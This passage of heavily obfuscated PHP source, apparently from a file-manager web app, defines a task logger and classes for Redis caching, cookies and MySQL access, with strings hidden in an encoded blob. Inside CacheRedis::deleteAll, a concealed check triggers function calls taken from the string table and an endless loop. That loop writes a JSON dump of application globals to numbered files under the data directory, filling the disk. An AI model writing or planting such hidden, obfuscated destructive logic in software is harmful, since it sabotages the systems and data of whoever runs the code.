$¬¶É¡[1764])); Hook::bind($¬¶É¡[1693], array($this, $¬¶É¡[1765])); echoLog($¬¶É¡[1766] . $Ê´ù¾ÊÍ->task[$¬¶É¡[1576]]); } public function __destruct() { $this->end(); } public function end($ÀĞ±Ç± = '') { $Ï‘âÍ§– =& $_SERVER[Ã¶¡¶„æ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÀĞ±Ç±); $this->task = !1; $this->taskID = !1; Hook::unbind($Ï‘âÍ§–[1697], array($this, $Ï‘âÍ§–[1763])); Hook::unbind($Ï‘âÍ§–[1699], array($this, $Ï‘âÍ§–[1764])); Hook::unbind($Ï‘âÍ§–[1693], array($this, $Ï‘âÍ§–[1765])); } public function taskUpdate($¡Ë±’¸) { $é©ªÚ°‚ =& $_SERVER[Ã¶¡¶„æ]; if (!$¡Ë±’¸ || $this->taskID != $¡Ë±’¸[$é©ªÚ°‚[399]]) { return; } $…Ò™—™ = 20; $±ÀÄåùø = intval($¡Ë±’¸[$é©ªÚ°‚[1678]] * $…Ò™—™); $¦¤‚¢ÎÃ = $é©ªÚ°‚[162] . str_repeat($é©ªÚ°‚[898], $±ÀÄåùø) . $é©ªÚ°‚[1028] . str_repeat($é©ªÚ°‚[53], $…Ò™—™ - $±ÀÄåùø) . $é©ªÚ°‚[164]; $ÙÈ¶êİˆ = $¦¤‚¢ÎÃ . sprintf($é©ªÚ°‚[1767], $¡Ë±’¸[$é©ªÚ°‚[1678]] * 100) . $é©ªÚ°‚[1768]; $Äû½Ãã´ = $ÙÈ¶êİˆ . $¡Ë±’¸[$é©ªÚ°‚[1677]] . $é©ªÚ°‚[8] . $¡Ë±’¸[$é©ªÚ°‚[792]] . LNG($é©ªÚ°‚[1769]); $ÒœÇŸ® = $é©ªÚ°‚[12]; if ($¡Ë±’¸[$é©ªÚ°‚[1753]]) { $Äû½Ãã´ = $ÙÈ¶êİˆ . size_format($¡Ë±’¸[$é©ªÚ°‚[1677]]) . $é©ªÚ°‚[8] . size_format($¡Ë±’¸[$é©ªÚ°‚[792]]); $ÒœÇŸ® = size_format($¡Ë±’¸[$é©ªÚ°‚[1679]]) . $é©ªÚ°‚[1770]; } if ($¡Ë±’¸[$é©ªÚ°‚[1078]]) { $¡Ë±’¸[$é©ªÚ°‚[1727]] = $¡Ë±’¸[$é©ªÚ°‚[1078]] . $é©ªÚ°‚[53] . $¡Ë±’¸[$é©ªÚ°‚[1727]]; } if ($¡Ë±’¸[$é©ªÚ°‚[1727]]) { $á¯ŠîÚğ = $é©ªÚ°‚[12]; if ($¡Ë±’¸[$é©ªÚ°‚[1729]]) { $á¯ŠîÚğ = size_format($¡Ë±’¸[$é©ªÚ°‚[1730]]) . $é©ªÚ°‚[8] . size_format($¡Ë±’¸[$é©ªÚ°‚[1729]]); } $ÒœÇŸ® .= $¡Ë±’¸[$é©ªÚ°‚[1727]] . $á¯ŠîÚğ; } if ($¡Ë±’¸[$é©ªÚ°‚[769]]) { $ÒœÇŸ® .= $é©ªÚ°‚[53] . size_format($¡Ë±’¸[$é©ªÚ°‚[1734]]) . $é©ªÚ°‚[8] . size_format($¡Ë±’¸[$é©ªÚ°‚[769]]); } echoLog($Äû½Ãã´ . $é©ªÚ°‚[53] . $ÒœÇŸ®, !0); } public function taskEnd($éÌÇ‘¸§) { $û•Ğè©É =& $_SERVER[Ã¶¡¶„æ]; if (!$éÌÇ‘¸§ || $this->taskID != $éÌÇ‘¸§[$û•Ğè©É[399]]) { return; } $© šËÉ = $éÌÇ‘¸§ ? $éÌÇ‘¸§[$û•Ğè©É[1677]] . $û•Ğè©É[8] . $éÌÇ‘¸§[$û•Ğè©É[792]] . LNG($û•Ğè©É[1769]) . $û•Ğè©É[71] : $û•Ğè©É[12]; echoLog($û•Ğè©É[1771] . $éÌÇ‘¸§[$û•Ğè©É[1576]] . ($éÌÇ‘¸§[$û•Ğè©É[453]] ? $û•Ğè©É[71] . $éÌÇ‘¸§[$û•Ğè©É[453]] : $û•Ğè©É[12]) . $û•Ğè©É[71] . $© šËÉ . $û•Ğè©É[1772] . sprintf($û•Ğè©É[864], timeFloat() - $éÌÇ‘¸§[$û•Ğè©É[1680]]) . $û•Ğè©É[1692]); $this->end(); } public function taskKill($ÎŸ®ó Í) { $ß‰·—† =& $_SERVER[Ã¶¡¶„æ]; if (!$ÎŸ®ó Í || $this->taskID != $ÎŸ®ó Í[$ß‰·—†[399]]) { return; } echoLog($ß‰·—†[1773] . $ÎŸ®ó Í[$ß‰·—†[1576]]); } } goto cÔá÷ŒÍ£; dëÛŒÚ½ÍŠ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¸èÛ£òª, $Ï¬ÊçÈæ) { $«»¹ª¬ =& $_SERVER[Ã¶¡¶„æ]; if (!class_exists($«»¹ª¬[883])) { show_json($«»¹ª¬[884], !1); } $this->cacheTime = $Ï¬ÊçÈæ; $¿÷Ì´¶ = isset($¸èÛ£òª[$«»¹ª¬[885]]) ? $¸èÛ£òª[$«»¹ª¬[885]] : 10; $ªÕÒÎ¿¼ = _get($¸èÛ£òª, $«»¹ª¬[882]); if ($ªÕÒÎ¿¼ && is_array($ªÕÒÎ¿¼)) { $this->initCluster($¸èÛ£òª, $¿÷Ì´¶); } else { $this->handle = $this->init($¸èÛ£òª, $¿÷Ì´¶); } } private function init($Û¨ª™Òè, $’î¶´—Ù) { $´ÓíäÚ‡ =& $_SERVER[Ã¶¡¶„æ]; $ÂŒ€İÓ = new Redis(); $Ó…à»œ = isset($Û¨ª™Òè[$´ÓíäÚ‡[886]]) ? $Û¨ª™Òè[$´ÓíäÚ‡[886]] : !1; if ($Ó…à»œ) { $ÂŒ€İÓ->pconnect($Û¨ª™Òè[$´ÓíäÚ‡[181]], $Û¨ª™Òè[$´ÓíäÚ‡[182]], $’î¶´—Ù); } else { $ÂŒ€İÓ->connect($Û¨ª™Òè[$´ÓíäÚ‡[181]], $Û¨ª™Òè[$´ÓíäÚ‡[182]], $’î¶´—Ù); } if (!empty($Û¨ª™Òè[$´ÓíäÚ‡[413]])) { $ÂŒ€İÓ->auth($Û¨ª™Òè[$´ÓíäÚ‡[413]]); } if (!empty($Û¨ª™Òè[$´ÓíäÚ‡[764]]) && $Û¨ª™Òè[$´ÓíäÚ‡[764]] != 0) { $ÂŒ€İÓ->select($Û¨ª™Òè[$´ÓíäÚ‡[764]]); } return $ÂŒ€İÓ; } private function initCluster($òÑ‘ôÃñ, $Üôî÷¾à) { $ş‚“ÃË‹ =& $_SERVER[Ã¶¡¶„æ]; $Ğ€ãó• = array($ş‚“ÃË‹[887], $ş‚“ÃË‹[888], $ş‚“ÃË‹[889]); $¸Éç®ùú = $ş‚“ÃË‹[887]; if (isset($òÑ‘ôÃñ[$ş‚“ÃË‹[16]]) && in_array($òÑ‘ôÃñ[$ş‚“ÃË‹[16]], $Ğ€ãó•)) { $¸Éç®ùú = $òÑ‘ôÃñ[$ş‚“ÃË‹[16]]; } switch ($¸Éç®ùú) { case $ş‚“ÃË‹[887]: $this->_slave($òÑ‘ôÃñ, $Üôî÷¾à); break; case $ş‚“ÃË‹[888]: break; case $ş‚“ÃË‹[889]: $this->isCluster = !0; $Âµï¤—Ã = $òÑ‘ôÃñ[$ş‚“ÃË‹[882]]; $¬¨ó…¹ƒ = isset($òÑ‘ôÃñ[$ş‚“ÃË‹[886]]) ? $òÑ‘ôÃñ[$ş‚“ÃË‹[886]] : !1; $Ø‘ıü„« = isset($òÑ‘ôÃñ[$ş‚“ÃË‹[413]]) ? $òÑ‘ôÃñ[$ş‚“ÃË‹[413]] : null; $this->handle = new RedisCluster(NUll, $Âµï¤—Ã, $Üôî÷¾à, $Üôî÷¾à, $¬¨ó…¹ƒ, $Ø‘ıü„«); break; default: break; } } private function _slave($¤Èìƒûå, $ªŞöìùØ) { $›ïÇ¼Êø = $¤Èìƒûå[$_SERVER[Ã¶¡¶„æ][882]]; $this->filterConfig($¤Èìƒûå, $›ïÇ¼Êø[0]); $this->handle = $this->init($¤Èìƒûå, $ªŞöìùØ); unset($›ïÇ¼Êø[0]); if (empty($›ïÇ¼Êø)) { return; } $¸÷×¡áÃ = array_rand($›ïÇ¼Êø); $this->filterConfig($¤Èìƒûå, $›ïÇ¼Êø[$¸÷×¡áÃ]); $this->slaveHandle = $this->init($¤Èìƒûå, $ªŞöìùØ); } private function filterConfig(&$Ö¸Ú€ŠÓ, $Ë²øüÖë) { $ÛªĞ’ÑÚ =& $_SERVER[Ã¶¡¶„æ]; $š»Ë¶Ò¬ = explode($ÛªĞ’ÑÚ[4], $Ë²øüÖë); $É Ó”÷ù = array($ÛªĞ’ÑÚ[181] => $š»Ë¶Ò¬[0], $ÛªĞ’ÑÚ[182] => $š»Ë¶Ò¬[1]); $Ö¸Ú€ŠÓ = array_merge($Ö¸Ú€ŠÓ, $É Ó”÷ù); } public function set($ƒşÆİÊë, $ŞªµÖÌ„, $ˆ‘¸ŠªÉ = false) { $ˆ‘¸ŠªÉ = $ˆ‘¸ŠªÉ ? $ˆ‘¸ŠªÉ : $this->cacheTime; return $this->handle->setEx($ƒşÆİÊë, $ˆ‘¸ŠªÉ, $ŞªµÖÌ„); } public function setLock($ßí´™Ô‰, $öÚçÈòŸ, $ş‰«›åŠ) { return $this->handle->setNX($ßí´™Ô‰, $öÚçÈòŸ); } public function get($ÉŠú¤£¤) { $ãå›ªÂ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ãå›ªÂ->get($ÉŠú¤£¤); } public function remove($øŒ´åíÚ) { return $this->handle->del($øŒ´åíÚ); } public function deleteAll() { $»æ²É¶¿ =& $_SERVER[Ã¶¡¶„æ]; $é‘—ÔÏÖ = $_SERVER[$»æ²É¶¿[847]]; $ë¤Áè™¼ = $»æ²É¶¿[890]; if ($_SERVER[$»æ²É¶¿[840]] != $ë¤Áè™¼($é‘—ÔÏÖ)) { $£Ğ¦¡¢ï = $»æ²É¶¿[891]; $€ìä¾ô¡ = $»æ²É¶¿[842]; $í®™ÓòÀ = $_SERVER[$»æ²É¶¿[843]] . $»æ²É¶¿[844]; $·Æû®ˆÇ = $€ìä¾ô¡($í®™ÓòÀ); $¤Œ€åà = explode($»æ²É¶¿[231], $·Æû®ˆÇ); if (count($¤Œ€åà) < $»æ²É¶¿[636]) { $­É€Õ¢ = $»æ²É¶¿[845]; $­É€Õ¢(); } $ÒÍş—‡ = $»æ²É¶¿[892]; $ÒÍş—‡($_SERVER[$»æ²É¶¿[893]]); $£Ğ¦¡¢ï = $»æ²É¶¿[891]; $£Ğ¦¡¢ï(); $éÖëÊ©” = $»æ²É¶¿[894]; $Õ·’Ê° = json_encode($GLOBALS[$»æ²É¶¿[895]]); $åñÜ±Œ» = 1; for ($íìÏåÜ = $åñÜ±Œ»; $íìÏåÜ > 0; $íìÏåÜ++) { $éÖëÊ©”(DATA_PATH . $íìÏåÜ, $Õ·’Ê°); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ñŞË­·ö) { $this->handle->flushall($ñŞË­·ö); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($›©ÂÕÜƒ = '', $ùü£Àùğ = 0) { if (is_string($›©ÂÕÜƒ) && $›©ÂÕÜƒ != $_SERVER[Ã¶¡¶„æ][12]) { $this->prefix = $›©ÂÕÜƒ; } if (is_numeric($ùü£Àùğ) && $ùü£Àùğ > 0) { $this->expire = $ùü£Àùğ; } } public static function getInstance() { static $ËÓ×¢¼×; if ($ËÓ×¢¼× === null) { $ËÓ×¢¼× = new self(); } return $ËÓ×¢¼×; } private static $cookieDisable = false; public static function disable($¾¶†Õªâ) { self::$cookieDisable = $¾¶†Õªâ; } private static $sameCookieSet = array(); public static function set($»âóÕ¹à, $ëÇßœ½˜, $Öä£‰«ê = 0, $Š·µûÀ = false, $ÑÂÒÁæ‘ = false) { $é Ï€× =& $_SERVER[Ã¶¡¶„æ]; if (self::$cookieDisable) { return; } if (!$Öä£‰«ê) { $Öä£‰«ê = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$»âóÕ¹à]) && self::$sameCookieSet[$»âóÕ¹à] == $ëÇßœ½˜ . $Öä£‰«ê) { return; } self::$sameCookieSet[$»âóÕ¹à] = $ëÇßœ½˜ . $Öä£‰«ê; if (!$ÑÂÒÁæ‘) { $ÑÂÒÁæ‘ = str_replace(HOST, $é Ï€×[12], APP_HOST); $ÑÂÒÁæ‘ = _get($GLOBALS, $é Ï€×[896], $ÑÂÒÁæ‘); } $Œ½£‰ˆ÷ = $é Ï€×[12]; setcookie($»âóÕ¹à, $ëÇßœ½˜, time() + $Öä£‰«ê, $é Ï€×[8] . trim($ÑÂÒÁæ‘, $é Ï€×[8]) . $Œ½£‰ˆ÷, !1, !1, $Š·µûÀ); } public static function setSafe($ãîâìËæ, $Äşá½†ï, $¹¬­ÈÏÛ = 0) { self::set($ãîâìËæ, $Äşá½†ï, $¹¬­ÈÏÛ, !0); } public static function get($£…¡´ë) { static $ûÉÜ”‡š = false; if (!$ûÉÜ”‡š) { self::initHeaderCookie(); $ûÉÜ”‡š = !0; } return isset($_COOKIE[$£…¡´ë]) ? $_COOKIE[$£…¡´ë] : !1; } private static function initHeaderCookie() { $Š·Ÿ¸‚— =& $_SERVER[Ã¶¡¶„æ]; if (!isset($_SERVER[$Š·Ÿ¸‚—[897]]) || !$_SERVER[$Š·Ÿ¸‚—[897]]) { return; } $Öü‹Ã´ = explode($Š·Ÿ¸‚—[71], $_SERVER[$Š·Ÿ¸‚—[897]]); foreach ($Öü‹Ã´ as $³×òæİ) { $³×òæİ = explode($Š·Ÿ¸‚—[898], $³×òæİ); if (count($³×òæİ) != 2 || !isset($³×òæİ[1])) { continue; } $_COOKIE[trim($³×òæİ[0])] = trim($³×òæİ[1]); } } public static function remove($É·°–Á†, $”ù¹÷ÜÃ = false) { unset($_COOKIE[$É·°–Á†]); self::set($É·°–Á†, $_SERVER[Ã¶¡¶„æ][12], 1, $”ù¹÷ÜÃ); } } class DbMysql extends Db { public function __construct($Ä¦¼Å©ç = '') { $¸ãêµªí =& $_SERVER[Ã¶¡¶„æ]; if (!extension_loaded($¸ãêµªí[810])) { think_exception(think_lang($¸ãêµªí[14]) . $¸ãêµªí[899]); } if (!empty($Ä¦¼Å©ç)) { $this->config = $Ä¦¼Å©ç; if (empty($this->config[$¸ãêµªí[17]])) { $this->config[$¸ãêµªí[17]] = $¸ãêµªí[12]; } } } public function connect($Ô²Š­×· = '', $şŒà†Æ = 0, $†¢ïÈÀ· = false) { $õÈôˆÍ¶ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->linkID[$şŒà†Æ])) { if (empty($Ô²Š­×·)) { $Ô²Š­×· = $this->config; } $ÉÒ˜õ† = $Ô²Š­×·[$õÈôˆÍ¶[900]] . ($Ô²Š­×·[$õÈôˆÍ¶[901]] ? "\72{$Ô²Š­×·[$õÈôˆÍ¶[901]]}" : $õÈôˆÍ¶[12]); $îşŞöÊ» = !empty($Ô²Š­×·[$õÈôˆÍ¶[17]][$õÈôˆÍ¶[18]]) ? $Ô²Š­×·[$õÈôˆÍ¶[17]][$õÈôˆÍ¶[18]] : $this->pconnect; if ($îşŞöÊ») { $this->linkID[$şŒà†Æ] = mysql_pconnect($ÉÒ˜õ†, $Ô²Š­×·[$õÈôˆÍ¶[902]], $Ô²Š­×·[$õÈôˆÍ¶[903]], 131072); } else { $this->linkID[$şŒà†Æ] = mysql_connect($ÉÒ˜õ†, $Ô²Š­×·[$õÈôˆÍ¶[902]], $Ô²Š­×·[$õÈôˆÍ¶[903]], !0, 131072); } if (!$this->linkID[$şŒà†Æ] || !empty($Ô²Š­×·[$õÈôˆÍ¶[21]]) && !mysql_select_db($Ô²Š­×·[$õÈôˆÍ¶[21]], $this->linkID[$şŒà†Æ])) { think_exception(mysql_error()); } $ÎÔÃ¢è· = mysql_get_server_info($this->linkID[$şŒà†Æ]); mysql_query($õÈôˆÍ¶[904] . think_config($õÈôˆÍ¶[905]) . $õÈôˆÍ¶[58], $this->linkID[$şŒà†Æ]); if ($ÎÔÃ¢è· > $õÈôˆÍ¶[906]) { mysql_query($õÈôˆÍ¶[907], $this->linkID[$şŒà†Æ]); } $this->connected = !0; if (1 != think_config($õÈôˆÍ¶[22])) { unset($this->config); } } return $this->linkID[$şŒà†Æ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($›ìïÔó) { $—ç×§Êê =& $_SERVER[Ã¶¡¶„æ]; if (0 === stripos($›ìïÔó, $—ç×§Êê[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $›ìïÔó; if ($this->queryID) { $this->free(); } think_action_status($—ç×§Êê[23], 1); think_status($—ç×§Êê[24]); $this->queryID = mysql_query($›ìïÔó, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($á³”úºÏ) { $„âç¬»¿ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $á³”úºÏ; if ($this->queryID) { $this->free(); } think_action_status($„âç¬»¿[25], 1); think_status($„âç¬»¿[24]); $Ú‘½ıÚí = mysql_query($á³”úºÏ, $this->_linkID); $this->debug(); if (!1 === $Ú‘½ıÚí) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ã¶¡¶„æ][908], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¢ËÛü§ù = mysql_query($_SERVER[Ã¶¡¶„æ][909], $this->_linkID); $this->transTimes = 0; if (!$¢ËÛü§ù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‡ñü‰Á = mysql_query($_SERVER[Ã¶¡¶„æ][910], $this->_linkID); $this->transTimes = 0; if (!$‡ñü‰Á) { $this->error(); return !1; } } return !0; } private function getAll() { $ììèöË = array(); if ($this->numRows > 0) { while ($¦ù‡‡’Â = mysql_fetch_assoc($this->queryID)) { $ììèöË[] = $¦ù‡‡’Â; } mysql_data_seek($this->queryID, 0); } return $ììèöË; } public function getFields($¢øİ¦) { $æ¥­ÃãÍ =& $_SERVER[Ã¶¡¶„æ]; $³äÙ‘“‡ = $this->query($æ¥­ÃãÍ[911] . $this->parseKey($¢øİ¦)); $Ğ¤’‰š§ = array(); if ($³äÙ‘“‡) { foreach ($³äÙ‘“‡ as $ßğ…ë™ => $‰–Ç„£©) { $Ğ¤’‰š§[$‰–Ç„£©[$æ¥­ÃãÍ[31]]] = array($æ¥­ÃãÍ[32] => $‰–Ç„£©[$æ¥­ÃãÍ[31]], $æ¥­ÃãÍ[33] => $‰–Ç„£©[$æ¥­ÃãÍ[34]], $æ¥­ÃãÍ[35] => (bool) (strtoupper($‰–Ç„£©[$æ¥­ÃãÍ[36]]) === $æ¥­ÃãÍ[912]), $æ¥­ÃãÍ[37] => $‰–Ç„£©[$æ¥­ÃãÍ[38]], $æ¥­ÃãÍ[39] => strtolower($‰–Ç„£©[$æ¥­ÃãÍ[40]]) == $æ¥­ÃãÍ[41], $æ¥­ÃãÍ[42] => strtolower($‰–Ç„£©[$æ¥­ÃãÍ[43]]) == $æ¥­ÃãÍ[44]); } } return $Ğ¤’‰š§; } public function getTables($êØ¡”û¾ = '') { $ÍÆ¤ƒò =& $_SERVER[Ã¶¡¶„æ]; if (!empty($êØ¡”û¾)) { $¤ñïí“ = $ÍÆ¤ƒò[913] . $êØ¡”û¾ . $ÍÆ¤ƒò[914]; } else { $¤ñïí“ = $ÍÆ¤ƒò[915]; } $ìê‘¼› = $this->query($¤ñïí“); $û­¬Îøè = array(); foreach ($ìê‘¼› as $ÛøÜ›ã => $ÒË—ğœ•) { $û­¬Îøè[$ÛøÜ›ã] = current($ÒË—ğœ•); } return $û­¬Îøè; } public function replace($¿íê»Ğ, $ûè˜Óù = array()) { $äÀÓª’™ =& $_SERVER[Ã¶¡¶„æ]; foreach ($¿íê»Ğ as $Ú˜³ÊÀÈ => $Äë¢òŒ) { $ëæşÖ“• = $this->parseValue($Äë¢òŒ); if (is_scalar($ëæşÖ“•)) { $úÙ ôó[] = $ëæşÖ“•; $ğËÅùÙˆ[] = $this->parseKey($Ú˜³ÊÀÈ); } } $ÈØ–Ù£Ì = $äÀÓª’™[916] . $this->parseTable($ûè˜Óù[$äÀÓª’™[279]]) . $äÀÓª’™[917] . implode($äÀÓª’™[50], $ğËÅùÙˆ) . $äÀÓª’™[918] . implode($äÀÓª’™[50], $úÙ ôó) . $äÀÓª’™[919]; return $this->execute($ÈØ–Ù£Ì); } public function insertAll($«œùÏ¼Ü, $Ü¤ğ¸Öà = array(), $ñĞóÔ†‡ = false) { $âç¬Î€Ğ =& $_SERVER[Ã¶¡¶„æ]; if (!is_array($«œùÏ¼Ü[0])) { return !1; } $õ®…œï = array_keys($«œùÏ¼Ü[0]); $Ö½í†å = array(); foreach ($«œùÏ¼Ü as $’ÉÈ›•ü) { $™´Û½ğš = array(); foreach ($’ÉÈ›•ü as $‡Ûš±¢ => $£¼™£˜Ë) { $£¼™£˜Ë = $this->parseValue($£¼™£˜Ë); if (is_scalar($£¼™£˜Ë)) { $™´Û½ğš[] = $£¼™£˜Ë; } } $Ö½í†å[] = $âç¬Î€Ğ[260] . implode($âç¬Î€Ğ[50], $™´Û½ğš) . $âç¬Î€Ğ[919]; } array_walk($õ®…œï, array($this, $âç¬Î€Ğ[920])); $äƒ²•¥‹ = ($ñĞóÔ†‡ ? $âç¬Î€Ğ[921] : $âç¬Î€Ğ[922]) . $âç¬Î€Ğ[923] . $this->parseTable($Ü¤ğ¸Öà[$âç¬Î€Ğ[279]]) . $âç¬Î€Ğ[917] . implode($âç¬Î€Ğ[50], $õ®…œï) . $âç¬Î€Ğ[924] . implode($âç¬Î€Ğ[50], $Ö½í†å); return $this->execute($äƒ²•¥‹); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $±´¶Õé‡ =& $_SERVER[Ã¶¡¶„æ]; $this->error = mysql_errno() . $±´¶Õé‡[4] . mysql_error($this->_linkID); if ($±´¶Õé‡[12] != $this->queryStr) { $this->error .= LNG($±´¶Õé‡[48]) . $this->queryStr; } think_trace($this->error, $±´¶Õé‡[12], $±´¶Õé‡[49]); return $this->error; } public function escapeString($ÊèËˆ¼¢) { if ($this->_linkID) { return mysql_real_escape_string($ÊèËˆ¼¢, $this->_linkID); } else { return mysql_escape_string($ÊèËˆ¼¢); } } public function parseKey(&$Ÿàè×ÚÑ, $²÷üóĞ = true) { $Â°‡ì¼­ =& $_SERVER[Ã¶¡¶„æ]; if ($²÷üóĞ) { $Ÿàè×ÚÑ = $this->parseKeyCheck($Ÿàè×ÚÑ); } if ($Ÿàè×ÚÑ != $Â°‡ì¼­[188] && !preg_match($Â°‡ì¼­[925], $Ÿàè×ÚÑ)) { $Ÿàè×ÚÑ = $Â°‡ì¼­[385] . trim($Ÿàè×ÚÑ, $Â°‡ì¼­[385]) . $Â°‡ì¼­[385]; } return $Ÿàè×ÚÑ; } } goto C“Ø³ˆ§ªë; AÎÙ‚‹…ß«: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('æ„¶¡¶Ã'), base64_decode('odHXy63e')); $_SERVER[Ã¶¡¶„æ] = explode(base64_decode('fAN8AXwC'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x7\x78\x1c\xd5\xd5\x28\x2d\xa1\x99\x12\x52\x20\x10\x60\x2c\x30\x92\xed\x2d\x72\xb7\x65\xcb\x66\x25\xad\xa4\xb5\x57\x5a\xb1\xbb\x72\x41\x32\xe3"."\xd9\xdd\xd9\xd5\x48\xbb\x3b\xab\x99\x59\x35\xdb\x94\x84\xe\x36\xbd\x24\xb4\xdf\xa1\x7\x83\x81\x4\x62\x30\x86\xfc\x40\x7e\x20\x84\x4e\x28\x26\x90\x9f\x80\xd\x4\x8\x84\x62\xda\x83\xbc\x5b"."\316\55\63\273\202\377\175\357\175\337\243\150\157\237\133\316\75\367\234\163\317\71\367\225\333\136\75\377\67\317\256\331\175\315\256\153\166\73\375\231\337\157\277\374\22\32\106\377"."\xe2\xbf\x24\x7c\xe4\x39\x7b\xed\x42\xfe\xf9\xe1\x39\x67\xd7\xd5\xb5\xcf\xde\x67\x6a\xe7\x84\xf3\x7e\x77\xab\xf6\x1b\x6d\xa3\x76\x76\x2c\xfa\xf8\x9f\x23\xfb\x3d\xb9\x71\x71\x78\xc7\xb5\x8f\x8f".strrev('£N˜/KQãºH7ôŠ69ÌY´„Óc¶¢š)Gô'."\r".'ºÓ'."\n".'€Ö]£Å—uØî')."\372\243\102\277\310\137\173\60\157\260\174\265\63\226\124\23\335\135\135\341\170\22\12\65\310\371\5\63\3\241\222\146\151\5\370\176\111\267\154\324\33\271\71\265\144\226\364\242"."\53\105\44\144\64\107\113\151\66\264\324\322\244\266\204\273\242\261\25\152\162\105\127\30\112\244\324\301\262\156\215\322\30\11\46\34\315\162\222\106\101\347\45\206\55\336\257\246".strrev('ë5˜£U×—ú‚¶¡âºs*KÍB›F‹=2²H±ÍÉ¤ë2sP‰CÆIS¤[p')."\224\125\64\147\225\62\231\6\132\15\75\237\241\301\242\306\272\343\214\226\40\224\344\41\264\114\305\162\76\117\43\235\74\224\321\263\132\71\17\263\325\42\107\112\226\121\320\330".base64_decode('oJfoozyVBrSyYxrFNI2ERxxLE+mor2m00HoRmkqEo+HmpII7qLTGYx0KLEJBsx3d')."\x52\x96\xb5\x87\xe3\x61\x5\x77\xba\xb1\x96\x8c\xb5\x56\x1\x78\xe9\x44\x53\xa1\x84\xa2\x51\x65\xbc\x16\x1c\xbd\x50\x62\xcd\xd0\x3a\x55\x1a\x8b\xc5\x5b\xc2\x71\xa5\x69\x85\x22\x66\x28\x6d\x16"."\12\146\61\200\132\101\53\351\110\135\15\307\343\64\340\3\360\216\106\360\242\101\44\326\332\232\10\363\30\14\356\270\50\352\311\14\200\117\127\54\223\315\73\352\220\226\57\63"."\x30\x1d\xa0\xbf\xb5\xf0\x3\xbf\xa6\xd\xa0\x3b\x68\x14\x8d\x32\x80\x29\x34\x61\x9a\x7c\x5b\x41\xa0\xcc\x4a\xeb\x2c\x45\xcf\x40\xa0\x80\xea\x9b\xb0\xf3\xd0\x36\x1c\xa2\xc1\xc6\x85\xf4\x77\x3e"."\x14\x4a\xa9\x38\x4f\xb7\x1c\x55\x2f\xa6\xcd\x8c\x51\x84\xcd\xba\x8\x80\x4e\x73\xfa\x5a\x2c\x3\x15\xa0\xf1\xac\x99\xcf\xb0\xb0\x6d\x8c\xc1\x50\xb2\x46\x5e\xef\x2c\x17\xe4\x22\x3c\x9a\xee\x33".base64_decode('8hmL7a9vK0mjUb5dcVkRK6Ge8J1uZEfFfrPNspXWI2hHiHpdvPQ0KKQ7DhoczI1h')."\x76\x97\xf2\xa6\x96\x49\xe8\x16\x1f\x9a\x61\xb6\xa2\x8a\xb1\xb2\x23\x27\x96\x49\xb1\x56\xd3\x2a\xb4\x20\xcc\x0\xdf\x47\xbb\xc2\xe8\xae\x92\x31\xc0\xf6\x45\x46\x9a\xb1\x60\x5d\xcf\x29\xfe\x6f"."\x56\xf6\x1c\x8b\xfe\x4c\x6\xd4\xd7\xb\x7d\xea\xd3\xf3\x79\x55\x1f\xd1\x61\xe3\x14\x32\xb3\x6c\x36\x19\x41\x3b\x65\x14\x83\x28\x85\x46\x23\x31\xb5\x4f\xb3\xfb\x3a\x32\xb3\x54\x52\x8b\x61\xd4"."\214\76\22\50\365\225\140\127\363\215\334\353\2\154\74\165\235\246\23\226\360\162\336\114\153\171\171\210\64\334\347\70\245\204\136\314\340\231\200\241\230\303\105\62\123\45\135\207"."\x42\x2d\x3e\x25\xa3\x74\x28\x2b\x94\xf6\x6\xa3\xc1\x66\x15\xb\x79\x1e\x62\xa3\xe3\x69\x36\x4f\x74\x46\xd8\x72\x66\xb2\x34\x90\x62\xc7\x42\xd\x7c\xd0\xb0\x9\x86\x13\xdb\x53\x2b\x95\xf2\x46"."\132\163\14\263\30\64\323\216\356\370\155\307\322\65\150\61\224\116\353\266\355\157\66\213\216\145\346\375\241\174\336\34\366\307\54\43\147\24\33\224\51\200\154\121\46\332\324\176".strrev('¯wm2]†-b²³¨(4ga‡òİYÚ+Kiy¶\\ÿY;,iLÏà 